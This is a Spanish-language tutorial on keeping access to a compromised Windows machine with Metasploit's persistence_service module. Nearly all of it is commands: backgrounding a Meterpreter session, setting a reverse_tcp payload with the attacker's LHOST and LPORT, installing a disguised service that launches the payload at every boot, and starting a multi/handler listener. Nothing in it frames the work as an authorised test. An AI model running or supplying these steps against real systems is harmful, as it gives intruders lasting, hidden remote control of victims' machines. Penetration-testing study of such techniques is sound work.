# Persistencia en Windows con Metasploit

## ¿Qué es la persistencia?

El objetivo de la **persistencia** es mantener el acceso a una máquina comprometida **aunque sea reiniciada o se cierre la sesión actual**. Sirve para asegurarte de que puedes **volver a entrar** en el sistema sin volver a explotar la vulnerabilidad inicial.

---

## Requisitos

- Acceso a una sesión **Meterpreter** en la máquina víctima.
- Permisos administrativos en la sesión.
- Conexión estable entre atacante y víctima.
  
---

## Paso a paso: Persistencia con `persistence_service`

### 1. Obtener información del sistema

```bash
sysinfo
```

Esto te ayuda a saber si necesitas usar un **payload de 32 bits (x86)** o **64 bits (x64)**.

---

### 2. Enviar la sesión al background

```bash
background
```

Esto libera la consola para lanzar nuevos módulos o exploits.

---

### 3. Usar el módulo de persistencia

```bash
use exploit/windows/local/persistence_service
```

Este módulo crea un servicio de Windows que ejecuta automáticamente un payload al reiniciar el sistema.

---

### 4. Configurar el módulo

```bash
set SESSION <ID de la sesión que mandaste al background>
set PAYLOAD windows/x64/meterpreter/reverse_tcp   # O usa x86 si x64 da error
set LHOST <tu IP>
set LPORT <puerto>
```

> ⚠️ Si al usar `x64` da error, cambia a `windows/meterpreter/reverse_tcp` (por defecto es x86).

---

### 5. Ejecutar el módulo

```bash
run
```

Este paso instala el servicio en la máquina víctima que iniciará el payload cuando el sistema arranque.

---

### 6. Preparar el listener (opcional si aún no lo tienes)

```bash
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <tu IP>
set LPORT <puerto>
run
```

---

## ¿Qué hace este módulo exactamente?

- Crea un **servicio legítimo** en Windows con un nombre disfrazado.
- El servicio está configurado para ejecutar el **payload de Metasploit**.
- El servicio se ejecuta cada vez que se **inicia el sistema**, generando una nueva sesión Meterpreter si el listener está activo.

---

## Beneficios

- Permite **reacceso automático** tras reinicio del sistema.
- Ideal para operaciones prolongadas o escenarios de post-explotación.
- No necesitas volver a explotar la máquina.
